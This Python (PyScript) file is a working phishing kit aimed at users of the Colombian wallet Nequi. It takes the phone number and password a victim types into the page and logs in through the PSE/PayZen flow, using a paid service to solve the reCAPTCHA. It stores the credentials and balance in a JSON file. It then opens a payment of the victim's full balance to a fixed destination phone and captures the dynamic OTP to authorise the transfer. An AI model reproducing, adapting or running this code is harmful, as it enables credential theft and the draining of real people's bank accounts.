import requests
from bs4 import BeautifulSoup
import execjs
import json
from pyscript import window, document
from anticaptchaofficial.recaptchav2proxyless import *

with open('j_password_generator.js', 'r') as file:
    javascript_code = file.read()

ctx = execjs.compile(javascript_code)

def checkBalance(phone, password):
  
  while True:
    
    Body = {"transaction":{"payment_type":2,"origin_name":"fakdgnggg","origin_lastname":"agadadadg","origin_document":"","origin_phone":"3010535523","origin_email":"saoijgsijgh@gmail.com","destination_phone":"3013516493","amount":"10000","supplier_code":"f0bd118b78388b4e4a02b40260c33a04d12a9ce314a3c4538de3cca294b25aa8"}}

    Headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
                "Accept": "application/json",
                "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
                "Accept-Encoding": "gzip, deflate, br",
                "Content-Type": "application/json",
                "Content-Length": "81",
                "Referer": "https://web.soyveci.com/",
                "Client-Platform": "web",
                "Origin": "https://web.soyveci.com",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site",
                "Connection": "keep-alive",
                "TE": "trailers"}

    r = requests.post('https://api.soyveci.com/transactions/smartlink/v2', json = Body, headers = Headers)

    date = r.json()["data"]["date"]
    code = r.json()["data"]["code"]
    signature_pse = r.json()["data"]["signature_pse"]

    Body = "vads_action_mode=INTERACTIVE&vads_amount=1000000&vads_ctx_mode=PRODUCTION&vads_currency=170&vads_cust_cell_phone=3010535523&vads_payment_cards=PSE&vads_cust_email=saoijgsijgh%40gmail.com&vads_cust_first_name=fakdgnggg&vads_cust_last_name=agadadadg&vads_language=es&vads_cust_phone=&vads_page_action=PAYMENT&vads_payment_config=SINGLE&vads_site_id=23824163&vads_trans_date=" + date + "&vads_trans_id=" + code + "&vads_version=V2&signature=" + signature_pse + "&pagar="

    Headers = {"Host": "secure.payzen.lat",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
                "Accept-Encoding": "gzip, deflate, br",
                "Referer": "https://soyveci.com/link/?phone=3013516493",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "493",
                "Origin": "https://soyveci.com",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "cross-site",
                "Sec-Fetch-User": "?1"}


    r = requests.post('https://secure.payzen.lat/vads-payment/', data = Body, headers = Headers)

    soup = BeautifulSoup(r.text, 'html.parser')
    submit_url_input = soup.find('input', {'name': 'submit_url'})
    
    try:
      submit_url_value = submit_url_input['value']
      break
    except TypeError:
      continue

  Body = {"nationalId":"1053353463","proofOfIdType":"CedulaDeCiudadania","email":"dgdshdgsgni@gmail.com","bankCode":"1507","bankLabel":"NEQUI","address":"agdg","city":"gsdgdgds"}

  Headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
              "accept": "application/json, text/javascript, */*; q=0.01",
              "accept-language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
              "accept-encoding": "gzip, deflate, br",
              "content-type": "application/json; charset=utf-8",
              "x-requested-with": "XMLHttpRequest",
              "content-length": "169",
              "origin": "https://secure.payzen.lat",
              "sec-fetch-dest": "empty",
              "sec-fetch-mode": "cors",
              "sec-fetch-site": "same-origin",
              "te": "trailers"}

  r = requests.post(submit_url_value, json = Body, headers = Headers)

  enc = r.json()["transaction"]["redirectURL"][r.json()["transaction"]["redirectURL"].find('enc=') + len('enc='):]

  Body = {
      "enc": enc,
      "fingerprint": "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"
  }

  Headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "accept": "application/json, text/javascript, */*; q=0.01",
    "accept-language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
    "accept-encoding": "gzip, deflate, br",
    "content-type": "application/json; charset=utf-8",
    "x-requested-with": "XMLHttpRequest",
    "origin": "https://registro.pse.com.co",
    "referer": r.json()["transaction"]["redirectURL"],
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "te": "trailers"}

  r = requests.post("https://registro.pse.com.co/PSENF/api/ProcessPayment", json = Body, headers = Headers)

  solverWebsiteURL = r.json()["url"]
  ticketId = r.json()["url"].split("|")[0].split("ticketId=")[1]
  trazabilityCode = r.json()["url"].split("|")[1]

  Headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://paga.nequi.com.co/",
    "Content-Type": "application/json; charset=utf-8",
    "x-dtreferer": r.json()["url"],
    "Origin": "https://paga.nequi.com.co",
    "DNT": "1",
    "Sec-GPC": "1",
    "Connection": "keep-alive",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "TE": "trailers"}

  r = requests.post("https://paga.nequi.com.co/bdigitalpsp/buildDataService?ticketId=" + ticketId + "&trazabilityCode=" + trazabilityCode, json = {}, headers = Headers)

  passPhrase = r.json()["responseMessage"]["responseBody"]["any"]["generatePassphraseRS"]["data"]
  passwordEncrypted = ctx.call("passEncrypt", passPhrase, password)

  solver = recaptchaV2Proxyless()
  solver.set_verbose(1)
  solver.set_key("2a86bedefd4fbabf7f1c7ec19cb85115")
  solver.set_website_key("6LdjCwshAAAAALml0fdmI80RRivlxm74orS_2V4i")
  solver.set_website_url(solverWebsiteURL)
  g_response = solver.solve_and_return_solution()

  Body = "j_username=" + phone + "&j_password="+ passwordEncrypted + "&g-recaptcha-response=" + g_response + "&ticketId=" + ticketId + "&trazabilityCode=" + trazabilityCode + "&passphraseName=" + passPhrase

  Headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "accept": "application/json, text/plain, */*",
    "accept-language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
    "accept-encoding": "gzip, deflate, br",
    "referer": "https://paga.nequi.com.co/",
    "content-type": "application/x-www-form-urlencoded",
    "content-length": "840",
    "origin": "https://paga.nequi.com.co",
    "dnt": "1",
    "sec-gpc": "1",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "te": "trailers",}

  r = requests.post("https://paga.nequi.com.co/bdigitalpsp/loginServiceAuthentication", data = Body, headers = Headers)

  LtpaToken2 = r.cookies.get("LtpaToken2")
  JSESSIONID = r.cookies.get("JSESSIONID")

  Body = {"RequestMessage":{"RequestHeader":{"Channel":"PP-001","Destination":{"ServiceRegion":"C001","ServiceVersion":"1.0.0","ServiceName":"GetBalanceServices","ServiceOperation":"getBalance"},"RequestDate":"2024-01-11 19:51:31","MessageID":"1705020691368","ClientID":""},"RequestBody":{"any":{"getBalanceRQ":{"userName":phone,"ticketId":ticketId,"trazabilityCode":trazabilityCode}}}}}

  Cookies = {
    "JSESSIONID": JSESSIONID,
    "LtpaToken2": LtpaToken2
  }

  Headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://paga.nequi.com.co/",
    "Content-Type": "application/json; charset=utf-8",
    "Content-Length": "393",
    "Origin": "https://paga.nequi.com.co",
    "Connection": "keep-alive",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "no-cors",
    "Sec-Fetch-Site": "same-origin",
    "TE": "trailers",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache"
  }

  r = requests.post("https://paga.nequi.com.co/bdigitalpsp/rest/services/private/GetBalanceServices/getBalance", json = Body, headers = Headers, cookies=Cookies)

  balance = r.json()["ResponseMessage"]["ResponseBody"]["any"]["getBalanceRS"]["freeAmt"]
  
  transactionData = {"phone": phone, "password": password, "balance": balance}
  
  with open("transactionData.json", 'w') as file:
    json.dump(transactionData, file)
    
def doPayment():
  
  phone = document.querySelector("#18284699798102960").value
  password = document.querySelector("#8189803747321869").value
  
  checkBalance(phone, password)
  
  with open("transactionData.json", 'r') as archivo:
    data = json.load(archivo)
    
  phone = data["phone"]
  password = data["phone"]
  balance = str(int(float(data["balance"])))
  
  Body = {"transaction":{"payment_type":2,"origin_name":"fakdgnggg","origin_lastname":"agadadadg","origin_document":"","origin_phone":"3010535523","origin_email":"saoijgsijgh@gmail.com","destination_phone":"3013516493","amount":balance,"supplier_code":"f0bd118b78388b4e4a02b40260c33a04d12a9ce314a3c4538de3cca294b25aa8"}}

  Headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
              "Accept": "application/json",
              "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
              "Accept-Encoding": "gzip, deflate, br",
              "Content-Type": "application/json",
              "Content-Length": "81",
              "Referer": "https://web.soyveci.com/",
              "Client-Platform": "web",
              "Origin": "https://web.soyveci.com",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "cors",
              "Sec-Fetch-Site": "same-site",
              "Connection": "keep-alive",
              "TE": "trailers"}

  r = requests.post('https://api.soyveci.com/transactions/smartlink/v2', json = Body, headers = Headers)

  date = r.json()["data"]["date"]
  code = r.json()["data"]["code"]
  signature_pse = r.json()["data"]["signature_pse"]

  Body = "vads_action_mode=INTERACTIVE&vads_amount=" + balance + "00&vads_ctx_mode=PRODUCTION&vads_currency=170&vads_cust_cell_phone=3010535523&vads_payment_cards=PSE&vads_cust_email=saoijgsijgh%40gmail.com&vads_cust_first_name=fakdgnggg&vads_cust_last_name=agadadadg&vads_language=es&vads_cust_phone=&vads_page_action=PAYMENT&vads_payment_config=SINGLE&vads_site_id=23824163&vads_trans_date=" + date + "&vads_trans_id=" + code + "&vads_version=V2&signature=" + signature_pse + "&pagar="

  Headers = {"Host": "secure.payzen.lat",
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
              "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
              "Accept-Encoding": "gzip, deflate, br",
              "Referer": "https://soyveci.com/link/?phone=3013516493",
              "Content-Type": "application/x-www-form-urlencoded",
              "Content-Length": "493",
              "Origin": "https://soyveci.com",
              "Connection": "keep-alive",
              "Upgrade-Insecure-Requests": "1",
              "Sec-Fetch-Dest": "document",
              "Sec-Fetch-Mode": "navigate",
              "Sec-Fetch-Site": "cross-site",
              "Sec-Fetch-User": "?1"}


  r = requests.post('https://secure.payzen.lat/vads-payment/', data = Body, headers = Headers)

  soup = BeautifulSoup(r.text, 'html.parser')
  submit_url_input = soup.find('input', {'name': 'submit_url'})
  submit_url_value = submit_url_input['value']

  Body = {"nationalId":"1053353463","proofOfIdType":"CedulaDeCiudadania","email":"dgdshdgsgni@gmail.com","bankCode":"1507","bankLabel":"NEQUI","address":"agdg","city":"gsdgdgds"}

  Headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
              "accept": "application/json, text/javascript, */*; q=0.01",
              "accept-language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
              "accept-encoding": "gzip, deflate, br",
              "content-type": "application/json; charset=utf-8",
              "x-requested-with": "XMLHttpRequest",
              "content-length": "169",
              "origin": "https://secure.payzen.lat",
              "sec-fetch-dest": "empty",
              "sec-fetch-mode": "cors",
              "sec-fetch-site": "same-origin",
              "te": "trailers"}

  r = requests.post(submit_url_value, json = Body, headers = Headers)

  enc = r.json()["transaction"]["redirectURL"][r.json()["transaction"]["redirectURL"].find('enc=') + len('enc='):]

  Body = {
      "enc": enc,
      "fingerprint": "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"
  }

  Headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "accept": "application/json, text/javascript, */*; q=0.01",
    "accept-language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
    "accept-encoding": "gzip, deflate, br",
    "content-type": "application/json; charset=utf-8",
    "x-requested-with": "XMLHttpRequest",
    "origin": "https://registro.pse.com.co",
    "referer": r.json()["transaction"]["redirectURL"],
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "te": "trailers"}

  r = requests.post("https://registro.pse.com.co/PSENF/api/ProcessPayment", json = Body, headers = Headers)

  solverWebsiteURL = r.json()["url"]
  ticketId = r.json()["url"].split("|")[0].split("ticketId=")[1]
  trazabilityCode = r.json()["url"].split("|")[1]

  Headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://paga.nequi.com.co/",
    "Content-Type": "application/json; charset=utf-8",
    "x-dtreferer": r.json()["url"],
    "Origin": "https://paga.nequi.com.co",
    "DNT": "1",
    "Sec-GPC": "1",
    "Connection": "keep-alive",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "TE": "trailers"}

  r = requests.post("https://paga.nequi.com.co/bdigitalpsp/buildDataService?ticketId=" + ticketId + "&trazabilityCode=" + trazabilityCode, json = {}, headers = Headers)

  passPhrase = r.json()["responseMessage"]["responseBody"]["any"]["generatePassphraseRS"]["data"]
  passwordEncrypted = ctx.call("passEncrypt", passPhrase, password)

  solver = recaptchaV2Proxyless()
  solver.set_verbose(1)
  solver.set_key("2a86bedefd4fbabf7f1c7ec19cb85115")
  solver.set_website_key("6LdjCwshAAAAALml0fdmI80RRivlxm74orS_2V4i")
  solver.set_website_url(solverWebsiteURL)
  g_response = solver.solve_and_return_solution()

  Body = "j_username=" + phone + "&j_password="+ passwordEncrypted + "&g-recaptcha-response=" + g_response + "&ticketId=" + ticketId + "&trazabilityCode=" + trazabilityCode + "&passphraseName=" + passPhrase

  Headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "accept": "application/json, text/plain, */*",
    "accept-language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
    "accept-encoding": "gzip, deflate, br",
    "referer": "https://paga.nequi.com.co/",
    "content-type": "application/x-www-form-urlencoded",
    "content-length": "840",
    "origin": "https://paga.nequi.com.co",
    "dnt": "1",
    "sec-gpc": "1",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "te": "trailers",}

  r = requests.post("https://paga.nequi.com.co/bdigitalpsp/loginServiceAuthentication", data = Body, headers = Headers)

  LtpaToken2 = r.cookies.get("LtpaToken2")
  JSESSIONID = r.cookies.get("JSESSIONID")

  Body = {"RequestMessage":{"RequestHeader":{"Channel":"PP-001","Destination":{"ServiceRegion":"C001","ServiceVersion":"1.0.0","ServiceName":"GetBalanceServices","ServiceOperation":"getBalance"},"RequestDate":"2024-01-11 19:51:31","MessageID":"1705020691368","ClientID":""},"RequestBody":{"any":{"getBalanceRQ":{"userName":phone,"ticketId":ticketId,"trazabilityCode":trazabilityCode}}}}}

  Cookies = {
    "JSESSIONID": JSESSIONID,
    "LtpaToken2": LtpaToken2
  }

  Headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://paga.nequi.com.co/",
    "Content-Type": "application/json; charset=utf-8",
    "Content-Length": "393",
    "Origin": "https://paga.nequi.com.co",
    "Connection": "keep-alive",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "no-cors",
    "Sec-Fetch-Site": "same-origin",
    "TE": "trailers",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache"
  }
  
  validateOtp = {"Cookies" : Cookies, "Headers" : Headers, "phone" : phone, "ticketId" : ticketId, "trazabilityCode" : trazabilityCode}
  
  with open("validateOtp.json", 'w') as file:
    json.dump(validateOtp, file)
    
  window.location.href = "dynamicPassword.html"
  
def validateOTP(token):
  
  with open("validateOtp.json", 'r') as file:
    data = json.load(file)
  
  Cookies = data["Cookies"]
  Headers = data["Headers"]
  phone = data["phone"]
  ticketId = data["ticketId"]
  trazabilityCode = data["trazabilityCode"]
  
  Body = {"RequestMessage":{"RequestHeader":{"Channel":"PP-001","Destination":{"ServiceRegion":"C001","ServiceVersion":"1.0.0","ServiceName":"OTPServices","ServiceOperation":"validateOtp"},"RequestDate":"2024-01-11 20:03:40","MessageID":"1705021420330","ClientID":""},"RequestBody":{"any":{"validateOTPRQ":{"pocketType":"4","pocketName":"Disponible","transactionId":"","token":token,"channel":"PseSalidaClaveDinamica","userName":phone,"ticketId":ticketId,"trazabilityCode":trazabilityCode}}}}}

  r = requests.post("https://paga.nequi.com.co/bdigitalpsp/rest/services/private/OTPServices/validateOtp", json = Body, headers = Headers, cookies=Cookies)
  
  print(r.json())
  




